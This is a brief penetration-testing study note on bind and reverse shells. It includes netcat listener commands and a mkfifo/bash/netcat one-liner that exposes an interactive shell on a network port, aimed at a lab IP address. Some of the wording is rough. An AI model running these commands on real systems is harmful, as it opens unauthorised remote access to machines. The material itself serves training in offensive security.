# Bind Shells
Are when you are using a listener and waits for a connection from the penetesters system.
### Using Netcat
```Bash
# Target starting the netcat listen
nc -lvnp 7777

# Attack box connecting to target
nc -nv 10.129.41.200 7777

# Attack Box sending a message 
nc -nv 10.129.41.200 7777
Hello box
# Typing the message, the target will receive it
```
### Using a TCP Session
```Bash
# This command will consider the payload manually
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

# Reverse Shells
The target will act like a client is this instance
Are when you are listening on an attack box and are waiting and the target is connecting back.
You can also use Powershell code to connect to the attacker box.
```Bash
# Attack Box
sudo nc -lvnp 443
```
